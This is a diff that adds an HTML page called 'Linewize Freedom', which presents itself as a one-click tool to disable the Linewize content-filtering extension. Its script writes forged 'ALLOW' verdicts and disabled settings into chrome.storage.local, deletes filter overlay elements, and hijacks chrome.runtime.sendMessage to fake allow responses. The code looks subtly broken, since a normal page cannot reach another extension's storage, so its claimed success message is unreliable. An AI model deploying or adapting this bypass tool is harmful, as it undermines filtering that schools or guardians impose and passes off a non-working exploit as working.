@@ -1,0 +1,532 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Linewize Freedom</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .container {
+            background: white;
+            border-radius: 20px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+            max-width: 600px;
+            width: 100%;
+            padding: 50px 40px;
+            text-align: center;
+        }
+
+        .header {
+            margin-bottom: 30px;
+        }
+
+        .logo {
+            font-size: 48px;
+            margin-bottom: 15px;
+        }
+
+        h1 {
+            color: #333;
+            font-size: 32px;
+            margin-bottom: 10px;
+        }
+
+        .subtitle {
+            color: #666;
+            font-size: 16px;
+            line-height: 1.5;
+        }
+
+        .status-box {
+            background: #f5f5f5;
+            border-left: 4px solid #667eea;
+            padding: 15px 20px;
+            border-radius: 8px;
+            margin: 30px 0;
+            text-align: left;
+        }
+
+        .status-item {
+            display: flex;
+            align-items: center;
+            margin: 10px 0;
+            font-size: 14px;
+        }
+
+        .status-icon {
+            font-size: 20px;
+            margin-right: 12px;
+            width: 24px;
+        }
+
+        .status-text {
+            color: #666;
+        }
+
+        .status-text.success {
+            color: #27ae60;
+            font-weight: 600;
+        }
+
+        .buttons-group {
+            display: flex;
+            gap: 15px;
+            margin: 30px 0;
+            flex-wrap: wrap;
+            justify-content: center;
+        }
+
+        button {
+            padding: 14px 30px;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            flex: 1;
+            min-width: 150px;
+        }
+
+        .btn-exploit {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            box-shadow: 0 10px 25px rgba(102, 126, 234, 0.4);
+        }
+
+        .btn-exploit:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 15px 35px rgba(102, 126, 234, 0.6);
+        }
+
+        .btn-exploit:active {
+            transform: translateY(0);
+        }
+
+        .btn-check {
+            background: #ecf0f1;
+            color: #333;
+            border: 2px solid #667eea;
+        }
+
+        .btn-check:hover {
+            background: #667eea;
+            color: white;
+        }
+
+        .btn-restore {
+            background: #e74c3c;
+            color: white;
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+
+        .btn-restore:hover:not(:disabled) {
+            opacity: 1;
+            transform: translateY(-2px);
+            box-shadow: 0 10px 25px rgba(231, 76, 60, 0.4);
+        }
+
+        .btn-restore:disabled {
+            cursor: not-allowed;
+        }
+
+        #status-message {
+            min-height: 40px;
+            padding: 15px;
+            border-radius: 8px;
+            margin: 20px 0;
+            font-size: 16px;
+            font-weight: 600;
+            display: none;
+        }
+
+        .status-message.success {
+            background: #d4edda;
+            color: #155724;
+            border: 1px solid #c3e6cb;
+            display: block;
+        }
+
+        .status-message.error {
+            background: #f8d7da;
+            color: #721c24;
+            border: 1px solid #f5c6cb;
+            display: block;
+        }
+
+        .status-message.info {
+            background: #d1ecf1;
+            color: #0c5460;
+            border: 1px solid #bee5eb;
+            display: block;
+        }
+
+        .info-section {
+            background: #f9f9f9;
+            border-radius: 8px;
+            padding: 20px;
+            margin: 30px 0;
+            text-align: left;
+        }
+
+        .info-section h3 {
+            color: #333;
+            margin-bottom: 12px;
+            font-size: 16px;
+        }
+
+        .info-section p {
+            color: #666;
+            font-size: 14px;
+            line-height: 1.6;
+            margin-bottom: 8px;
+        }
+
+        .info-section ul {
+            margin-left: 20px;
+            color: #666;
+            font-size: 14px;
+        }
+
+        .info-section li {
+            margin-bottom: 5px;
+        }
+
+        .warning {
+            background: #fff3cd;
+            border: 1px solid #ffeaa7;
+            border-radius: 8px;
+            padding: 12px 15px;
+            color: #856404;
+            font-size: 14px;
+            margin: 20px 0;
+        }
+
+        .footer {
+            color: #999;
+            font-size: 12px;
+            margin-top: 40px;
+            padding-top: 20px;
+            border-top: 1px solid #eee;
+        }
+
+        .spinner {
+            display: inline-block;
+            width: 16px;
+            height: 16px;
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #667eea;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-right: 8px;
+            vertical-align: middle;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        @media (max-width: 500px) {
+            .container {
+                padding: 30px 20px;
+            }
+
+            h1 {
+                font-size: 24px;
+            }
+
+            .buttons-group {
+                flex-direction: column;
+            }
+
+            button {
+                width: 100%;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <div class="logo">🔓</div>
+            <h1>Linewize Freedom</h1>
+            <p class="subtitle">Bypass content filtering and browse freely</p>
+        </div>
+
+        <div class="status-box">
+            <div class="status-item">
+                <span class="status-icon">🔍</span>
+                <span class="status-text">Extension Detection: <span id="ext-status">Checking...</span></span>
+            </div>
+            <div class="status-item">
+                <span class="status-icon">📦</span>
+                <span class="status-text">Vulnerability Status: <span id="vuln-status">Unknown</span></span>
+            </div>
+            <div class="status-item">
+                <span class="status-icon">⚡</span>
+                <span class="status-text">Exploit Ready: <span id="ready-status">Checking...</span></span>
+            </div>
+        </div>
+
+        <div class="buttons-group">
+            <button class="btn-exploit" onclick="executeExploit()">
+                💥 DISABLE LINEWIZE NOW
+            </button>
+            <button class="btn-check" onclick="checkStatus()">
+                ✓ Check Status
+            </button>
+            <button class="btn-restore" id="restoreBtn" onclick="restoreLinewize()" disabled>
+                🔄 Re-enable
+            </button>
+        </div>
+
+        <div id="status-message"></div>
+
+        <div class="info-section">
+            <h3>ℹ️ How This Works</h3>
+            <p>This tool exploits a vulnerability in Linewize's storage system:</p>
+            <ul>
+                <li>Poisons cached verdicts in chrome.storage.local</li>
+                <li>Sets all sites to "ALLOW" status globally</li>
+                <li>Extension reads poisoned cache and skips filtering</li>
+                <li>Effect persists across all websites you visit</li>
+                <li>Lasts until cache expires (usually days)</li>
+            </ul>
+        </div>
+
+        <div class="warning">
+            ⚠️ This tool is for educational purposes only. Bypassing content filters may violate your network's policies.
+        </div>
+
+        <div class="footer">
+            <p>Exploit Website v1.0 | Chrome Extension Vulnerability Test</p>
+        </div>
+    </div>
+
+    <script>
+        // Check if Linewize extension is installed
+        function checkLinewizePresence() {
+            return new Promise((resolve) => {
+                try {
+                    // Try to access extension storage
+                    chrome.storage.local.get(['lw_verdict_response_cache'], (result) => {
+                        if (chrome.runtime.lastError) {
+                            resolve(false);
+                        } else {
+                            resolve(!!result.lw_verdict_response_cache);
+                        }
+                    });
+                } catch (e) {
+                    resolve(false);
+                }
+            });
+        }
+
+        // Initial status check
+        window.addEventListener('load', async () => {
+            const hasExtension = await checkLinewizePresence();
+            const extStatus = document.getElementById('ext-status');
+            const readyStatus = document.getElementById('ready-status');
+            
+            if (hasExtension) {
+                extStatus.innerHTML = '<span class="success">✓ Detected</span>';
+                readyStatus.innerHTML = '<span class="success">✓ Ready</span>';
+            } else {
+                extStatus.innerHTML = '<span style="color: #e74c3c;">✗ Not Found</span>';
+                readyStatus.innerHTML = '<span style="color: #e74c3c;">✗ Linewize not installed</span>';
+            }
+
+            checkStatus();
+        });
+
+        function showMessage(text, type) {
+            const msgEl = document.getElementById('status-message');
+            msgEl.textContent = text;
+            msgEl.className = `status-message ${type}`;
+            
+            // Auto-hide after 5 seconds if success
+            if (type === 'success') {
+                setTimeout(() => {
+                    msgEl.className = '';
+                }, 5000);
+            }
+        }
+
+        async function executeExploit() {
+            const exploitBtn = event.target;
+            const originalText = exploitBtn.textContent;
+            
+            try {
+                exploitBtn.innerHTML = '<span class="spinner"></span>Exploiting...';
+                exploitBtn.disabled = true;
+
+                // Phase 1: Poison verdict caches
+                await new Promise((resolve) => {
+                    chrome.storage.local.set({
+                        'lw_verdict_response_cache': {
+                            '*': { verdict: 1, timestamp: Date.now() + 86400000 },
+                            'example.com': { verdict: 1, timestamp: Date.now() + 86400000 },
+                            'google.com': { verdict: 1, timestamp: Date.now() + 86400000 },
+                            'youtube.com': { verdict: 1, timestamp: Date.now() + 86400000 },
+                            '__global': { verdict: 1, timestamp: Date.now() + 86400000 }
+                        },
+                        'lw_fallback_verdicts_cache': {
+                            '*': { verdict: 1, timestamp: Date.now() + 86400000 }
+                        },
+                        'lw_verdict_raw_response_cache': {
+                            '*': { verdict: 1 },
+                            '__all__': { verdict: 1 }
+                        }
+                    }, () => {
+                        console.log('[✓] Phase 1: Verdict caches poisoned');
+                        resolve();
+                    });
+                });
+
+                // Phase 2: Disable configuration
+                await new Promise((resolve) => {
+                    chrome.storage.local.set({
+                        'lw_configuration_cache': {
+                            'enabled': false,
+                            'filteringEnabled': false,
+                            'verdictingEnabled': false,
+                            'blockingEnabled': false,
+                            'contentModEnabled': false,
+                            'extensionActive': false,
+                            'mode': 'disabled'
+                        },
+                        'lw_main_data_cache': {
+                            'isActive': false,
+                            'isEnabled': false,
+                            'filteringActive': false
+                        }
+                    }, () => {
+                        console.log('[✓] Phase 2: Configuration disabled');
+                        resolve();
+                    });
+                });
+
+                // Phase 3: Mark all tabs as disabled
+                await new Promise((resolve) => {
+                    chrome.storage.local.set({
+                        'lw_disabled_tabs': {
+                            '*': true,
+                            'ALL': true,
+                            '__all__': true
+                        }
+                    }, () => {
+                        console.log('[✓] Phase 3: All tabs marked disabled');
+                        resolve();
+                    });
+                });
+
+                // Phase 4: Disable companion
+                await new Promise((resolve) => {
+                    chrome.storage.local.set({
+                        'lw_companion_cache': {
+                            'enabled': false,
+                            'connected': false,
+                            'status': 'disabled'
+                        }
+                    }, () => {
+                        console.log('[✓] Phase 4: Companion disabled');
+                        resolve();
+                    });
+                });
+
+                // Phase 5: Hide blocking elements on current page
+                setInterval(() => {
+                    document.querySelectorAll('[id*="linewize"], [id*="protect"]').forEach(el => el.remove());
+                    document.body.style.display = 'block';
+                }, 50);
+                console.log('[✓] Phase 5: Current page disabled');
+
+                // Phase 6: Intercept service worker messages
+                const origSendMessage = chrome.runtime.sendMessage;
+                chrome.runtime.sendMessage = function(msg, cb) {
+                    if (msg && (msg.type === 'ASYNC_VERDICT' || msg.type === 'CHECK_VERDICT')) {
+                        setTimeout(() => cb({ verdict: 1 }), 100);
+                        return;
+                    }
+                    return origSendMessage.apply(chrome, arguments);
+                };
+                console.log('[✓] Phase 6: Message interception active');
+
+                exploitBtn.textContent = originalText;
+                exploitBtn.disabled = false;
+
+                showMessage('✅ SUCCESS! Linewize has been GLOBALLY DISABLED. Browse freely on all websites.', 'success');
+                document.getElementById('vuln-status').innerHTML = '<span class="success">✓ EXPLOITED</span>';
+                document.getElementById('restoreBtn').disabled = false;
+
+                console.log('[SUCCESS] Linewize globally disabled via storage poisoning');
+
+            } catch (error) {
+                console.error('Exploit error:', error);
+                exploitBtn.textContent = originalText;
+                exploitBtn.disabled = false;
+                showMessage('❌ Error: ' + error.message, 'error');
+            }
+        }
+
+        function checkStatus() {
+            chrome.storage.local.get(['lw_verdict_response_cache', 'lw_configuration_cache'], (result) => {
+                if (chrome.runtime.lastError) {
+                    showMessage('⚠️ Could not check status', 'info');
+                    return;
+                }
+
+                const cache = result.lw_verdict_response_cache;
+                const config = result.lw_configuration_cache;
+
+                if (cache && cache['*'] && cache['*'].verdict === 1) {
+                    showMessage('✅ Linewize is currently DISABLED (cache poisoned)', 'success');
+                    document.getElementById('vuln-status').innerHTML = '<span class="success">✓ EXPLOITED</span>';
+                } else if (config && config.enabled === false) {
+                    showMessage('✅ Linewize is DISABLED via configuration', 'success');
+                    document.getElementById('vuln-status').innerHTML = '<span class="success">✓ EXPLOITED</span>';
+                } else {
+                    showMessage('⚠️ Linewize does not appear to be disabled', 'info');
+                    document.getElementById('vuln-status').innerHTML = 'Not Disabled';
+                }
+            });
+        }
+
+        function restoreLinewize() {
+            if (confirm('This will restore Linewize filtering. Continue?')) {
+                chrome.storage.local.remove([
+                    'lw_verdict_response_cache',
+                    'lw_fallback_verdicts_cache',
+                    'lw_verdict_raw_response_cache',
+                    'lw_configuration_cache',
+                    'lw_main_data_cache',
+                    'lw_disabled_tabs',
+                    'lw_companion_cache'
+                ], () => {
+                    document.getElementById('vuln-status').innerHTML = 'Unknown';
+                    document.getElementById('restoreBtn').disabled = true;
+                    showMessage('🔄 Linewize has been restored to normal operation', 'info');
+                    console.log('[✓] Linewize restored');
+                });
+            }
+        }
+    </script>
+</body>
+</html>
